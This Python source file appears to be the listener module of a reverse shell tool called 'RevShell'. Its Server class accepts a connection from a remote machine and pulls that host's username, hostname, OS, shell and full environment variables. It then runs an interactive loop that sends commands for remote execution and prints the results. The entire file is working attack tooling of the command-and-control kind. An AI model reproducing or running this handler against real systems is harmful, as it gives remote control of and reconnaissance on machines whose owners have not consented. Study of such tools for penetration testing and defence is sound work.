from .nodeutils import (
    os,
    socket,
    Path,
    subprocess,
    struct,
    sys,
    StreamSocket,
    utils
)


class Server(StreamSocket):
    """TCP socket server class for the command shell"""
    def __init__(
        self,
        lhost: str,
        port: int,
        opsys: str,
        verbose: bool,
        debug: bool,
        shell: str = None
    ):
        shell_path = self.get_exec(opsys, shell)[0]
        super().__init__(lhost, port, shell_path, debug)
        self.Verbose = verbose

    @staticmethod
    def _env(env_info: str) -> dict:
        """Protected helper method to format client environment info
        received from socket stream. Returns environment as dictionary"""
        environ = {}

        for item in env_info.split(", "):
            pair = item.split(": ", maxsplit=1)
            try:
                environ.update({pair[0]: pair[1]})
            except IndexError:
                pass

        return environ

    def shutdown(self, socks: tuple) -> None:
        """Cleanup and close each socket in <socks> tuple"""
        for sock in socks:
            try:
                sock.shutdown(socket.SHUT_WR)
            except OSError:
                pass
            finally:
                sock.close()

    def listen(self) -> None:
        """Begin listening for incoming TCP connection from the client shell"""
        # TODO: configure timeouts and blocking
        addr = ()
        client_sock = socket.socket()
        server_sock = socket.socket()

        server_sock.settimeout(180)
        server_sock.bind((self.Address, self.Port))

        server_sock.listen(1)  # stay open for one connection
        utils.status(f"Listening for incoming TCP connections on port {self.Port}...")

        try:
            client_sock, addr = server_sock.accept()
        except socket.timeout:
            client_sock.close()
            server_sock.close()
            utils.throw("The listening socket has timeout out")
        finally:
            server_sock.setblocking(True)

        with client_sock:
            # TODO: ?> print additional info in opening banner?
            utils.status(f"Received connection from {addr[0]} on port {addr[1]}")

            # send ==> established message
            self.send_msg(
                client_sock,
                f"Connection established with {socket.gethostname()}"
            )

            # receive <== current user/host information
            user_info = self.recv_msg(client_sock).split("::")

            self.UserName = str(user_info[0])
            self.Hostname = str(user_info[1])
            self.LastWD = str(user_info[2])
            self.RemoteOpSys = str(user_info[3])
            self.Shell = str(user_info[4])
            local_time = str(user_info[5])
            self.Environment = self._env(user_info[6])

            if self.RemoteOpSys == "nt":
                shell_name = self.Shell.split("\\")[-1]
            else:
                shell_name = self.Shell.split("/")[-1]

            # receive <== system information
            sys_info = self.recv_msg(client_sock)

            print(f"\r\n{local_time}")
            print(f"{sys_info}")
            print("-" * 25)
            print(f"Hostname: {self.Hostname}")
            print(f"Username: {self.UserName}")
            print(f"Shell: {shell_name}\r\n")

            try:
                while True:
                    # TODO: use text wrap when output is larger than console
                    print(self.get_prompt(), end="")
                    command = input()

                    # send ==> command to be executed
                    self.send_msg(client_sock, command)
                    family = self.check_special(command)

                    if family == "exit":
                        if self.Verbose:
                            utils.status("Exiting RevShell")
                        break

                    # receive <==  command output
                    out_type, output = self.recv_cmd(client_sock)

                    if family == "clear":
                        # TODO: scroll back not completely clearing
                        print(utils.Ansi.clear(), end="")
                    elif family == "cd":
                        if out_type == "output":
                            self.LastWD = output
                        utils.status(level=out_type, stdin=command)
                    else:
                        utils.status(output, out_type, stdin=command)
            except Exception as exc:
                self.shutdown((client_sock, server_sock))
                self.except_handler(exc)
            finally:
                self.shutdown((client_sock, server_sock))
